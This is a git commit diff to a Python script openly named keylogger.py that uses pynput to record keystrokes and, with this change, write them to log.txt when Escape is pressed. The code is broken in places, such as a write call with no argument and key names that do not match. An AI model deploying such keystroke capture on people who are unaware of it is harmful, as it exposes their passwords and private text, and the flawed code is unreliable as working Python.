b13d8b38e3e984ad110bb2e2fc046792220e5672
Styvensoft <steveen.echeverri@gmail.com>
2022-11-04 22:10:11 -0500

    Created log file keys

--- keylogger.py
+++ keylogger.py
@@ -1,10 +1,15 @@
 import pynput.keyboard
 
-key_list = []
+log_file = open('log.txt', 'w+')
 
-def print():
+def printOne():
     key = ''.join(key_list)
-    print(key)
+    ## print(key)
+    log_file.write()
+    log_file.write('\n')
+    log_file.close()
+
+key_list = []
 
 def press(key):
     key1 = convertOne(key)
@@ -12,9 +17,14 @@ def press(key):
 
     if key1 == 'Key.esc':
         print('Exit...')
+        printOne()
+        return False
 
     elif key1 == 'key.space':
-        key_list.append()
+        key_list.append(" ")
+
+    elif key1 == 'key.enter':
+        key_list.append('\n')
 
     else:
         key_list.append(key1)
